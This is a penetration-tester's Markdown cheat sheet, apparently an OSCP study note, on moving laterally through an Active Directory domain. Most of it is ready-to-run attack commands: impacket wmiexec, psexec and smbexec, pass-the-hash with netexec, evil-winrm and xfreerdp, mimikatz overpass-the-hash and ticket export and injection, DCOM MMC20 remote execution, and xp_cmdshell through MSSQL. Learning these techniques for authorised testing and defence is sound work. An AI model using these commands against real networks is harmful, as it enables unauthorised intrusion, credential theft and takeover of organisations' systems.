# Active Directory Lateral Movement

Lateral movement = move from one compromised host/account -> another host/account in the domain.

current access  
	-> validate creds / tokens / hashes / tickets  
	-> identify reachable target  
	-> confirm permission  
	-> execute command / open shell / access share  
	-> document path

| Method        | Common Ports      | Requirement                        |
| ------------- | ----------------- | ---------------------------------- |
| SMB / PsExec  | 445               | local admin + `ADMIN$`             |
| WMI           | 135 + dynamic RPC | local admin                        |
| WinRM / WinRS | 5985 / 5986       | admin or Remote Management Users   |
| RDP           | 3389              | RDP allowed + valid login rights   |
| DCOM          | 135 + dynamic RPC | local admin                        |
| MSSQL         | 1433              | SQL creds / SQLAdmin               |
| Kerberos      | 88                | valid domain auth / tickets        |
| LDAP          | 389 / 636         | domain enumeration / object checks |

with credentials can also move to [pivoting](../07-post-exploitation/pivoting.md)

---
## Table of Contents

- [Pre-Movement Checks](#pre-movement-checks)
- [WMI Lateral Movement](#wmi-lateral-movement)
- [WinRM / WinRS / PowerShell Remoting](#winrm--winrs--powershell-remoting)
    - [WinRS](#winrs)
    - [PowerShell Remoting](#powershell-remoting)
    - [Evil-WinRM](#evil-winrm)
    - [PsExec](#psexec)
- [Pass-the-Hash](#pass-the-hash)
- [Overpass-the-Hash](#overpass-the-hash)
- [Pass-the-ticket](#pass-the-ticket)
- [DCOM Lateral Movement](#dcom-lateral-movement)
- [RDP](#rdp)
- [MSSQL Movement](#mssql-movement)

---

## Lateral Movement Decision Tree


```text
Have plaintext password?
    -> test SMB / WinRM / RDP / MSSQL
    -> netexec first
    -> then use method matching open port

Have NTLM hash?
    -> PtH over SMB / WinRM
    -> impacket-wmiexec / psexec / evil-winrm

Have Kerberos ticket?
    -> klist
    -> access matching service
    -> PTT if needed

Have local admin on host?
    -> PsExec / WMI / DCOM / WinRM

Have only RDP group?
    -> xfreerdp

Host unreachable directly?
    -> pivot/tunnel first
    -> see tunneling-and-pivoting.md
```


---

## Manual Validation Template

```
Current user:  
Current host:  
Credential material:  
Target host:  
Target IP:  
Open ports:  
Method:  
Required permissions:  
Validation command:  
Result:  
Next action:  
Cleanup:
```

Example:

```
Current user: domain.com\username  
Current host: workstation01  
Credential material: password  
Target host: files01  
Target IP: target_ip  
Open ports: 445, 5985  
Method: WinRM  
Required permissions: Remote Management Users / local admin  
Validation command: whoami; hostname  
Result: success  
Next action: enumerate target  
Cleanup: remove test files
```


---

## Pre-Movement Checks

```powershell
# current identity

whoami
whoami /groups
whoami /priv
hostname
ipconfig /all

# domain context
echo %USERDOMAIN%
echo %LOGONSERVER%
whoami /fqdn
nltest /dsgetdc:domain.com
nltest /domain_trusts
```

```bash
# Check reachable services
nmap -Pn -p 445,135,3389,5985,5986,1433 target_ip
```

```powershell
# Check reachable services
Test-NetConnection target_ip -Port 445
Test-NetConnection target_ip -Port 5985
Test-NetConnection target_ip -Port 3389
Test-NetConnection target_ip -Port 135
```

[netexec](../03-tools/netexec.md)
```bash
# Check where creds work
# nxc_bloop to loop through different commands more easily! 

./nxc_bloop.sh -t ALICE_IP -P smb,winrm -u alice -p 'password'
```


---

## WMI Lateral Movement

WMI = Windows Management Instrumentation.

valid admin creds  
	-> create remote process  
	-> process usually runs in session 0  
	-> good for command execution / reverse shell

Requirements:
	local admin on target  
	RPC reachable  
	TCP/135 reachable  
	dynamic RPC ports reachable  
	firewall allows WMI

```powershell
# WMI with PowerShell / CIM

# Create credential object:
$username = 'domain.com\username'
$password = 'password'
$secureString = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString

# Create WMI/CIM session over DCOM:
$options = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName target_ip -Credential $credential -SessionOption $options

# Execute safe validation command:
$command = 'cmd /c hostname > C:\Windows\Temp\lm_test.txt'
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=$command}

# Check output if you have file/share access:
type \\target_hostname\C$\Windows\Temp\lm_test.txt

ProcessId ReturnValue PSComputerName  
--------- ----------- --------------  
3948 0 target_ip

# ReturnValue 0 = process creation succeeded.
```


```bash
# WMI with Impacket

# password access
impacket-wmiexec domain.com/username:'password'@target_ip

# hash
impacket-wmiexec -hashes :ntlm_hash domain.com/username@target_ip
```

```powershell
# validate
hostname  
whoami
```

troubleshooting
WMI process created
    -> but no visible window
    -> normal, session 0 behavior

valid creds fail
    -> check local admin rights
    -> check firewall
    -> check RPC reachability
    -> check domain vs local auth

reverse shell fails
    -> check outbound firewall
    -> check listener IP
    -> check AV / Defender


---

## WinRM / WinRS / PowerShell Remoting

WinRM = Windows Remote Management.

ports
```text
5985 HTTP
5986 HTTPS
```

Requirements:
	WinRM enabled
	valid creds
	user in local Administrators or Remote Management Users
	firewall allows 5985/5986

#### WinRS

```bash
winrs -r:target_hostname -u:domain.com\username -p:password "cmd /c hostname & whoami"

target_hostname
domain.com\username
```

#### PowerShell Remoting

```powershell
# Create credential object
$username = 'domain.com\username'
$password = 'password'
$secureString = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString

# Create session
New-PSSession -ComputerName target_ip -Credential $credential

# Enter session
Enter-PSSession 1

# Validate
whoami
hostname
```

#### Evil-WinRM

[evil-winrm](../03-tools/evil-winrm.md)

```bash
evil-winrm -i target_ip -u username -p 'password' -r domain.com
evil-winrm -i target_ip -u username -H ntlm_hash -r domain.com
```

#### PsExec

PsExec-style movement = remote service creation over SMB.

Requirements:
	target TCP/445 reachable
	valid local admin rights
	ADMIN$ share available
	File and Printer Sharing enabled
	service creation allowed

What happens:
	connect to ADMIN$
	copy service binary
	create remote service
	execute command
	cleanup service

```bash
cp /home/username/oscp/exploits/PsExec64.exe .
```

```powershell
# Sysinternals PsExec
.\PsExec64.exe \\target_hostname -u domain.com\username -p password cmd

# validate
hostname
whoami
```


```bash
# Impacket PsExec

# password
impacket-psexec domain.com/username:'password'@target_ip
# hash
impacket-psexec -hashes :ntlm_hash domain.com/username@target_ip
```

troubleshooting

creds valid but PsExec fails
    -> user may not be local admin
    -> ADMIN$ may be disabled
    -> SMB blocked
    -> service creation blocked
    -> AV blocks service binary


---

## Pass-the-Hash

Pass the Hash = authenticate with NTLM hash instead of plaintext password.

Requirements
	TCP/445 for SMB-based tools  
	valid NTLM hash  
	local admin for remote command execution  
	target allows NTLM

```bash
# PtH with Impacket
impacket-wmiexec -hashes :ntlm_hash administrator@target_ip
impacket-psexec -hashes :ntlm_hash administrator@target_ip
impacket-smbexec -hashes :ntlm_hash administrator@target_ip

# validate
hostname
whoami
```

```bash
# Check access
netexec smb target_ip -u administrator -H ntlm_hash --local-auth

# Command execution if admin:
netexec smb target_ip -u administrator -H ntlm_hash --local-auth -x "whoami"

# Domain hash: 
netexec smb target_ip -u username -H ntlm_hash -d domain.com
```


---

## Overpass-the-Hash

Overpass the Hash = use NTLM hash to obtain Kerberos TGT.

NTLM hash
    -> create logon session
    -> request Kerberos TGT
    -> use Kerberos-native tools

[mimikatz](../03-tools/mimikatz.md) OPTH 
```
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:username /domain:domain.com /ntlm:ntlm_hash /run:powershell
```

```powershell
net use \\target_hostname
```

```powershell
# In new PowerShell window:
klist

# look for
krbtgt/domain.com  
cifs/target_hostname
```

```powershell
.\PsExec.exe \\target_hostname cmd

# validate
whoami
hostname
```


---

## Pass-the-ticket

Pass the Ticket = inject Kerberos ticket into current session.

Useful when: 
	valid TGS/TGT available  
	want access to specific service  
	plaintext password/hash not needed  
	ticket still valid

[mimikatz](../03-tools/mimikatz.md) PTT 
```
# export tickets
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export

# inject ticket
mimikatz # kerberos::ptt ticket.kirbi
```

```powershell
# verify
klist

# use service
dir \\target_hostname\share_name
```

TGT = broad Kerberos ticket-granting ticket  
TGS = service-specific ticket  
  
`cifs/target_hostname  `
	-> useful for SMB share access  
  
`http/target_hostname  `
	-> useful for web service auth  
  
`mssql/target_hostname  `
	-> useful for MSSQL service auth


---

## DCOM Lateral Movement

DCOM = Distributed Component Object Model.

Requirements:
	TCP/135 reachable  
	dynamic RPC reachable  
	local admin rights  
	DCOM not blocked

MMC20.Application DCOM

```powershell
# Create remote COM object:
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","target_ip"))

# Execute safe validation command:
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c hostname > C:\Windows\Temp\dcom_test.txt","7")

# if accessible:
type \\target_hostname\C$\Windows\Temp\dcom_test.txt

# cmd syntax 
# ExecuteShellCommand(command, directory, parameters, window_state)
# e.g.
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c whoami","7")
```


---

## RDP

RDP = interactive login.

Requirements:
	TCP/3389 reachable  
	RDP enabled  
	valid credentials  
	user allowed to log on via RDP

```bash
xfreerdp /cert:ignore /u:username /p:'password' /d:domain.com /v:target_ip /dynamic-resolution

# with drive mount
xfreerdp /cert:ignore /u:username /p:'password' /d:domain.com /v:target_ip /drive:share,/tmp

# with NTLM hash if Restricted Admin enabled
xfreerdp /cert:ignore /u:username /pth:ntlm_hash /d:domain.com /v:target_ip
```


---


## MSSQL Movement

Useful when
	SQL creds valid  
	SQLAdmin relationship exists  
	MSSQL exposed on 1433  
	xp_cmdshell enabled or can be enabled


```bash
# check access
netexec mssql target_ip -u username -p 'password' -d domain.com

# impacket
impacket-mssqlclient domain.com/username:'password'@target_ip -windows-auth
```

```sql
# inside MSSQL
SELECT SYSTEM_USER;  
SELECT @@version;

# check xp_cmdshell
EXEC xp_cmdshell 'whoami';
```


---

Troubleshooting

```text
valid creds != local admin  
Pwn3d! indicator still needs manual validation  
RDP access != admin  
WinRM may fail even if SMB works  
WMI uses session 0 -> no visible GUI  
IP address may force NTLM instead of Kerberos  
hostname/FQDN may be required for Kerberos  
firewall may block dynamic RPC  
ADMIN$ missing breaks PsExec  
ticket may only work for one service
```

